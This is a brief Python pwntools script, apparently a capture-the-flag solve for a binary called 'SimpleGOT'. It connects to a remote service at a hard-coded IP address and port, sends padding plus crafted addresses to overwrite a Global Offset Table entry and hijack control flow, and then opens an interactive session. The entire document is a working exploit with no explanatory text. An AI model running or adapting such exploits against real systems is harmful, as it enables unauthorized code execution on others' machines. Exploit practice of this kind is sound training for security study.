from pwn import *

local = False
elf = 'SimpleGOT' 

if local: 
	context.binary = './'+elf
	r = process("./"+elf)
else: 
	ip = "140.114.77.172"
	port = 10001
	r = remote(ip,port)

payload = p64(0x601018+0x10, endian='little') # turn
payload2 = p64(0x400686, endian='little')

print(r.recvuntil(':'))
r.send(('A'*16)+payload)
print(r.recvuntil(':'))
r.send(payload2)

r.interactive()
